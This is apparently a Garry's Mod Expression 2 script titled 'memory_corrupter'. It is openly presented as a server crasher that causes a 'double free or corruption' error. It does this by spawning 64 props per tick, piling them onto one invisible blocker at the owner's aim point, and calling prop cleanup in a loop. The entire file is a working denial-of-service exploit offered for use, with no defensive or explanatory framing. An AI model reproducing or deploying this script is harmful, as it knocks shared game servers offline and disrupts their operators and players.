@name exploits/memory_corrupter
@persist Blocker:entity Owner:entity MODEL:string PROPS_PER_TICK

# by yours truly
# c++ level server crasher
# "double free or corruption"

# probably only works on 64-bit servers

if( first() ){
    
    MODEL = "models/props_junk/PopCan01a.mdl"
    PROPS_PER_TICK = 64

    Owner = owner()
    Blocker = propSpawn("models/hunter/blocks/cube025x025x025.mdl",Owner:shootPos(),1)
    Blocker:setAlpha(0)
    
    runOnTick(1)
    
}

Blocker:setPos(Owner:shootPos())
for(I=1,PROPS_PER_TICK){
    concmd("gm_spawn "+MODEL)
}

findIncludeModel(MODEL)
findInSphere(Blocker:pos(),44)
Ents = findToArray()

foreach(N,Ent:entity=Ents){
    Ent:setPos( Blocker:pos() )    
}

concmd("gmod_cleanup props")
